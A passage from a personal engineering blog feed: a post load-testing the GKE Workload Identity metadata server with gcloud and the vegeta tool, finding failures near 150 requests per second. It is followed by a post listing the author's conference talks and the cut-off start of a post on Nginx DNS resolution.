<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">for i in {1..N}; do gcloud auth print-access-token &amp; done; wait;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Everything seemed to work fine when N was 100. When N was 200 I got a few errors like the below.
They look like client-side errors and not server ones though.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">ERROR</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gcloud failed to load</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">No module named &#39;ruamel.yaml.error&#39;</span>
</span><span class='line'><span class="l-Scalar-Plain">gcloud_main = _import_gcloud_main()</span>
</span><span class='line'><span class="l-Scalar-Plain">import googlecloudsdk.gcloud_main</span>
</span><span class='line'><span class="l-Scalar-Plain">from googlecloudsdk.api_lib.iamcredentials import util as iamcred_util</span>
</span><span class='line'><span class="l-Scalar-Plain">from googlecloudsdk.api_lib.util import exceptions</span>
</span><span class='line'><span class="l-Scalar-Plain">from googlecloudsdk.core.resource import resource_printer</span>
</span><span class='line'><span class="l-Scalar-Plain">from googlecloudsdk.core.resource import yaml_printer</span>
</span><span class='line'><span class="l-Scalar-Plain">from googlecloudsdk.core.yaml import dict_like</span>
</span><span class='line'><span class="l-Scalar-Plain">from googlecloudsdk.core import yaml_location_value</span>
</span><span class='line'><span class="l-Scalar-Plain">from ruamel import yaml</span>
</span><span class='line'><span class="l-Scalar-Plain">from ruamel.yaml.main import *</span> <span class="c1"># NOQA</span>
</span><span class='line'><span class="l-Scalar-Plain">from ruamel.yaml.error import UnsafeLoaderWarning, YAMLError</span> <span class="c1"># NOQA</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">This usually indicates corruption in your gcloud installation or problems with your Python interpreter.</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">Please verify that the following is the path to a working Python 2.7 or 3.5+ executable</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="l-Scalar-Plain">/usr/bin/python3</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">If it is not, please set the CLOUDSDK_PYTHON environment variable to point to a working Python 2.7 or 3.5+ executable.</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">If you are still experiencing problems, please reinstall the Cloud SDK using the instructions here</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="l-Scalar-Plain">https://cloud.google.com/sdk/</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">ERROR</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gcloud failed to load</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">cannot import name &#39;opentype&#39; from &#39;pyasn1.type&#39; (/usr/bin/../lib/google-cloud-sdk/lib/third_party/pyasn1/type/__init__.py)</span>
</span><span class='line'><span class="l-Scalar-Plain">from google.auth.crypt import _cryptography_rsa</span>
</span><span class='line'><span class="l-Scalar-Plain">import cryptography.exceptions</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">File &quot;/usr/bin/../lib/google-cloud-sdk/lib/gcloud.py&quot;, line 67, in main</span>
</span><span class='line'><span class="l-Scalar-Plain">File &quot;/usr/bin/../lib/google-cloud-sdk/lib/gcloud.py&quot;, line 48, in _import_gcloud_main</span>
</span><span class='line'><span class="l-Scalar-Plain">File &quot;/usr/lib/google-cloud-sdk/lib/googlecloudsdk/gcloud_main.py&quot;, line 33, in &lt;module&gt;</span>
</span><span class='line'><span class="l-Scalar-Plain">File &quot;/usr/lib/google-cloud-sdk/lib/googlecloudsdk/api_lib</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>gcloud</code> does not synchronize between processes with concurrent invokations. It sometimes writes
files to disk. So this is also not a great load test because it still doesn&rsquo;t let you achieve a
specific RPS and has client-side bottlenecks.</p>

<h2>Level 3</h2>

<p>Use a proper HTTP load testing tool. A colleague told me about <a href="https://github.com/tsenart/vegeta"><code>vegeta</code></a>.
It&rsquo;s a seemingly good tool, but, more importantly, its commands are amazing.
<code>vegeta attack ...</code>.</p>

<p>I first start a <code>golang</code> Pod that just busy-waits.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">$ cat &lt;&lt;EOF | kubectl --context [CONTEXT] apply -f -</span>
</span><span class='line'><span class="l-Scalar-Plain">&gt; apiVersion</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">v1</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err"> kind: Pod</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err"> metadata:</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">   name: wi-test</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">   namespace: [NAMESPACE]</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err"> spec:</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">   containers:</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">   - image: golang:latest</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">     name: wi-test</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">     command: [ &#39;/bin/bash&#39;, &#39;-c&#39;, &#39;--&#39; ]</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">     args: [ &#39;while true; do sleep 30; done;&#39; ]</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">     resources:</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">       limits:</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">         cpu: 2</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">         memory: 4G</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">       requests:</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">         cpu: 2</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err">         memory: 4G</span>
</span><span class='line'><span class="p-Indicator">&gt;</span><span class="err"> EOF</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">pod/wi-test created</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then I get a shell in it.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">kubectl --context [CONTEXT] -n [NAMESPACE] exec -it wi-test bash</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">Defaulting container name to wi-test.</span>
</span><span class='line'><span class="l-Scalar-Plain">Use &#39;kubectl describe pod/wi-test -n [NAMESPACE]&#39; to see all of the containers in this pod.</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">root@wi-test:/go# go get github.com/tsenart/vegeta</span>
</span><span class='line'><span class="l-Scalar-Plain">root@wi-test:/go# vegeta -version</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">Version</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="l-Scalar-Plain">Commit</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="l-Scalar-Plain">Runtime</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">go1.14.1 linux/amd64</span>
</span><span class='line'><span class="l-Scalar-Plain">Date</span><span class="p-Indicator">:</span>
</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s throw some load on WI! <code>my-gsa@my-project.iam.gserviceaccount.com</code> is the GSA associated with
the KSA your workload runs as.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">root@wi-test:/go# echo &quot;GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot; | vegeta attack -header &#39;Metadata-Flavor</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Google&#39; -rate 10 -duration=5s | vegeta report</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">Requests      [total, rate, throughput]         50, 10.20, 10.20</span>
</span><span class='line'><span class="l-Scalar-Plain">Duration      [total, attack, wait]             4.904s, 4.9s, 4.168ms</span>
</span><span class='line'><span class="l-Scalar-Plain">Latencies     [min, mean, 50, 90, 95, 99, max]  4.168ms, 6.137ms, 5.039ms, 9.591ms, 10.444ms, 31.452ms, 31.452ms</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes In      [total, mean]                     25300, 506.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes Out     [total, mean]                     0, 0.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Success       [ratio]                           100.00%</span>
</span><span class='line'><span class="l-Scalar-Plain">Status Codes  [code:count]                      200:50</span>
</span><span class='line'><span class="l-Scalar-Plain">Error Set</span><span class="p-Indicator">:</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">root@wi-test:/go# echo &quot;GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot; | vegeta attack -header &#39;Metadata-Flavor</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Google&#39; -rate 1000 -duration=5s | vegeta report</span>
</span><span class='line'><span class="l-Scalar-Plain">Requests      [total, rate, throughput]         5000, 1000.20, 127.51</span>
</span><span class='line'><span class="l-Scalar-Plain">Duration      [total, attack, wait]             31.175s, 4.999s, 26.176s</span>
</span><span class='line'><span class="l-Scalar-Plain">Latencies     [min, mean, 50, 90, 95, 99, max]  101.972ms, 11.003s, 7.652s, 30s, 30s, 30s, 30.001s</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes In      [total, mean]                     2011350, 402.27</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes Out     [total, mean]                     0, 0.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Success       [ratio]                           79.50%</span>
</span><span class='line'><span class="l-Scalar-Plain">Status Codes  [code:count]                      0:1025  200:3975</span>
</span><span class='line'><span class="l-Scalar-Plain">Error Set</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="l-Scalar-Plain">Get &quot;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot;</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">context deadline exceeded (Client.Timeout exceeded while awaiting headers)</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">root@wi-test:/go# echo &quot;GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot; | vegeta attack -header &#39;Metadata-Flavor</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Google&#39; -rate 100 -duration=5s | vegeta report</span>
</span><span class='line'><span class="l-Scalar-Plain">Requests      [total, rate, throughput]         500, 100.20, 98.40</span>
</span><span class='line'><span class="l-Scalar-Plain">Duration      [total, attack, wait]             5.081s, 4.99s, 91.244ms</span>
</span><span class='line'><span class="l-Scalar-Plain">Latencies     [min, mean, 50, 90, 95, 99, max]  3.805ms, 106.449ms, 59.058ms, 306.334ms, 372.519ms, 506.703ms, 601.534ms</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes In      [total, mean]                     253000, 506.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes Out     [total, mean]                     0, 0.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Success       [ratio]                           100.00%</span>
</span><span class='line'><span class="l-Scalar-Plain">Status Codes  [code:count]                      200:500</span>
</span><span class='line'><span class="l-Scalar-Plain">Error Set</span><span class="p-Indicator">:</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">root@wi-test:/go# echo &quot;GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot; | vegeta attack -header &#39;Metadata-Flavor</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Google&#39; -rate 500 -duration=5s | vegeta report</span>
</span><span class='line'><span class="l-Scalar-Plain">Requests      [total, rate, throughput]         2500, 500.20, 43.29</span>
</span><span class='line'><span class="l-Scalar-Plain">Duration      [total, attack, wait]             34.072s, 4.998s, 29.074s</span>
</span><span class='line'><span class="l-Scalar-Plain">Latencies     [min, mean, 50, 90, 95, 99, max]  10.56ms, 12.579s, 756.03ms, 30s, 30s, 30s, 30.001s</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes In      [total, mean]                     746350, 298.54</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes Out     [total, mean]                     0, 0.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Success       [ratio]                           59.00%</span>
</span><span class='line'><span class="l-Scalar-Plain">Status Codes  [code:count]                      0:1025  200:1475</span>
</span><span class='line'><span class="l-Scalar-Plain">Error Set</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="l-Scalar-Plain">Get &quot;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot;</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">context deadline exceeded (Client.Timeout exceeded while awaiting headers)</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">root@wi-test:/go# echo &quot;GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot; | vegeta attack -header &#39;Metadata-Flavor</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Google&#39; -rate 250 -duration=5s | vegeta report</span>
</span><span class='line'><span class="l-Scalar-Plain">Requests      [total, rate, throughput]         1250, 250.22, 28.52</span>
</span><span class='line'><span class="l-Scalar-Plain">Duration      [total, attack, wait]             34.996s, 4.996s, 30s</span>
</span><span class='line'><span class="l-Scalar-Plain">Latencies     [min, mean, 50, 90, 95, 99, max]  8.331ms, 6.347s, 376.419ms, 30s, 30s, 30s, 30.001s</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes In      [total, mean]                     504988, 403.99</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes Out     [total, mean]                     0, 0.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Success       [ratio]                           79.84%</span>
</span><span class='line'><span class="l-Scalar-Plain">Status Codes  [code:count]                      0:252  200:998</span>
</span><span class='line'><span class="l-Scalar-Plain">Error Set</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="l-Scalar-Plain">Get &quot;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot;</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">context deadline exceeded (Client.Timeout exceeded while awaiting headers)</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">root@wi-test:/go# echo &quot;GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot; | vegeta attack -header &#39;Metadata-Flavor</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Google&#39; -rate 200 -duration=5s | vegeta report</span>
</span><span class='line'><span class="l-Scalar-Plain">Requests      [total, rate, throughput]         1000, 200.20, 28.28</span>
</span><span class='line'><span class="l-Scalar-Plain">Duration      [total, attack, wait]             32.43s, 4.995s, 27.435s</span>
</span><span class='line'><span class="l-Scalar-Plain">Latencies     [min, mean, 50, 90, 95, 99, max]  9.985ms, 2.739s, 188.509ms, 797.058ms, 30s, 30s, 30s</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes In      [total, mean]                     464002, 464.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes Out     [total, mean]                     0, 0.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Success       [ratio]                           91.70%</span>
</span><span class='line'><span class="l-Scalar-Plain">Status Codes  [code:count]                      0:83  200:917</span>
</span><span class='line'><span class="l-Scalar-Plain">Error Set</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="l-Scalar-Plain">Get &quot;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot;</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">context deadline exceeded (Client.Timeout exceeded while awaiting headers)</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">root@wi-test:/go# echo &quot;GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot; | vegeta attack -header &#39;Metadata-Flavor</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Google&#39; -rate 150 -duration=5s | vegeta report</span>
</span><span class='line'><span class="l-Scalar-Plain">Requests      [total, rate, throughput]         750, 150.20, 146.53</span>
</span><span class='line'><span class="l-Scalar-Plain">Duration      [total, attack, wait]             5.118s, 4.993s, 125.078ms</span>
</span><span class='line'><span class="l-Scalar-Plain">Latencies     [min, mean, 50, 90, 95, 99, max]  3.747ms, 224.285ms, 171.325ms, 460.236ms, 549.18ms, 682.161ms, 892.25ms</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes In      [total, mean]                     379500, 506.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes Out     [total, mean]                     0, 0.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Success       [ratio]                           100.00%</span>
</span><span class='line'><span class="l-Scalar-Plain">Status Codes  [code:count]                      200:750</span>
</span><span class='line'><span class="l-Scalar-Plain">Error Set</span><span class="p-Indicator">:</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">root@wi-test:/go# echo &quot;GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot; | vegeta attack -header &#39;Metadata-Flavor</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Google&#39; -rate 175 -duration=5s | vegeta report</span>
</span><span class='line'><span class="l-Scalar-Plain">Requests      [total, rate, throughput]         875, 175.20, 24.46</span>
</span><span class='line'><span class="l-Scalar-Plain">Duration      [total, attack, wait]             34.097s, 4.994s, 29.103s</span>
</span><span class='line'><span class="l-Scalar-Plain">Latencies     [min, mean, 50, 90, 95, 99, max]  3.704ms, 1.687s, 231.652ms, 708.672ms, 2.432s, 30s, 30s</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes In      [total, mean]                     422004, 482.29</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes Out     [total, mean]                     0, 0.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Success       [ratio]                           95.31%</span>
</span><span class='line'><span class="l-Scalar-Plain">Status Codes  [code:count]                      0:41  200:834</span>
</span><span class='line'><span class="l-Scalar-Plain">Error Set</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="l-Scalar-Plain">Get &quot;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot;</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">context deadline exceeded (Client.Timeout exceeded while awaiting headers)</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">root@wi-test:/go# echo &quot;GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot; | vegeta attack -header &#39;Metadata-Flavor</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Google&#39; -rate 165 -duration=5s | vegeta report</span>
</span><span class='line'><span class="l-Scalar-Plain">Requests      [total, rate, throughput]         825, 165.20, 23.61</span>
</span><span class='line'><span class="l-Scalar-Plain">Duration      [total, attack, wait]             34.6s, 4.994s, 29.606s</span>
</span><span class='line'><span class="l-Scalar-Plain">Latencies     [min, mean, 50, 90, 95, 99, max]  3.483ms, 558.613ms, 222.111ms, 531.49ms, 622.473ms, 11.851s, 30s</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes In      [total, mean]                     413402, 501.09</span>
</span><span class='line'><span class="l-Scalar-Plain">Bytes Out     [total, mean]                     0, 0.00</span>
</span><span class='line'><span class="l-Scalar-Plain">Success       [ratio]                           99.03%</span>
</span><span class='line'><span class="l-Scalar-Plain">Status Codes  [code:count]                      0:8  200:817</span>
</span><span class='line'><span class="l-Scalar-Plain">Error Set</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="l-Scalar-Plain">Get &quot;http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/my-gsa@my-project.iam.gserviceaccount.com/token&quot;</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">context deadline exceeded (Client.Timeout exceeded while awaiting headers)</span>
</span></code></pre></td></tr></table></div></figure>


<p>After more bisection, I found that this specific instance of <code>gke-metadata-server</code>
starts to fail around 150RPS. When it does fail, p99 latency skyrockets from less than 1 second to
30 seconds. This is usually a sign of a rate limiter or quota.</p>

<p>How have you tried load testing WI or other GKE features? What&rsquo;re your favorite load testing tools
for these cases, and what interesting behavior have you found?</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Becoming a Better Public Speaker]]></title>
    <link href="https://www.davidxia.com/2019/05/becoming-a-better-public-speaker/"/>
    <updated>2019-05-26T00:04:59+02:00</updated>
    <id>https://www.davidxia.com/2019/05/becoming-a-better-public-speaker</id>
    <content type="html"><![CDATA[<p>At the beginning of this year I set a goal of becoming a better public speaker
and more visible in both tech and other broader causes I believe in. I&rsquo;m happy
to say that in the last two months I gave three talks! Two were prepared talks
with slides at tech conferences. The other was an unprepared conversation on a
podcast. These were all technical and related to my work at Spotify. Outside
of Spotify, I spoke for one minute at a mock political town hall in front of
about 30 people and at a public policy forum for ~15 minutes in front of
roughly the same number of people. But more on that later. Here are my
technical talks. These talks wouldn&rsquo;t be possible without the help, feedback,
and moral support from my Spotify colleagues.</p>

<h2>1. Keynote at KubeCon + CloudNativeCon Europe 2019 in Barcelona on May 22, 2019</h2>

<p><a href="https://kccnceu19.sched.com/event/MQbb/keynote-how-spotify-accidentally-deleted-all-its-kube-clusters-with-no-user-impact-david-xia-infrastructure-engineer-spotify">&ldquo;How Spotify Accidentally Deleted All its Kube Clusters with No User Impact&rdquo;</a></p>

<iframe width="750" height="422" src="https://www.youtube.com/embed/ix0Tw8uinWs" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>


<h2>2. Kubernetes Podcast from Google on April 23, 2019</h2>

<p><a href="https://kubernetespodcast.com/episode/050-spotify/">&ldquo;Spotify, with David Xia&rdquo;</a>. Listen on <a href="https://open.spotify.com/show/0AsnxlMtXRUEeZkIO0ScpJ">Spotify here</a>.</p>

<h2>3. Joint talk with Google at Google Next SF on April 11, 2019</h2>

<p><a href="https://cloud.withgoogle.com/next/sf/sessions?session=HYB316">&ldquo;GKE Usage Metering: Whose Line Item Is It Anyway?&rdquo;</a></p>

<iframe width="750" height="422" src="https://www.youtube.com/embed/EuBc1v27hY8?start=1036" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[More About Nginx DNS Resolution Than You Ever Wanted to Know]]></title>
    <link href="https://www.davidxia.com/2019/05/more-about-nginx-dns-resolution-than-you-ever-wanted-to-know/"/>
    <updated>2019-05-17T12:58:38-04:00</updated>
    <id>https://www.davidxia.com/2019/05/more-about-nginx-dns-resolution-than-you-ever-wanted-to-know</id>
    <content type="html"><![CDATA[<p>This is a post about Nginx&rsquo;s DNS resolution behavior I didn&rsquo;t know about but wish I did before I
started using Kubernetes (K8s).</p>

<h2>Nginx caches statically configured domains once</h2>

<h3>Symptoms</h3>

<p>I moved a backend service <code>foo</code> from running on a virtual machine to K8s. Foo&rsquo;s clients include an
Nginx instance running outside K8s configured with this <code>upstream</code> block.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>upstream foo {
</span><span class='line'>  server foo.example.com.;
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>server {
</span><span class='line'>  ...
</span><span class='line'>
</span><span class='line'>  location ~* /_foo/(.*) {
</span><span class='line'>    proxy_pass https://foo/$1;
</span><span class='line'>    ...
</span><span class='line'>  }
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>K8s Pods can be rescheduled anytime so their IPs aren&rsquo;t stable. I&rsquo;m supposed to use K8s Services
to avoid caching these ephemeral Pod IPs. But in my case because of interoperability reasons I was
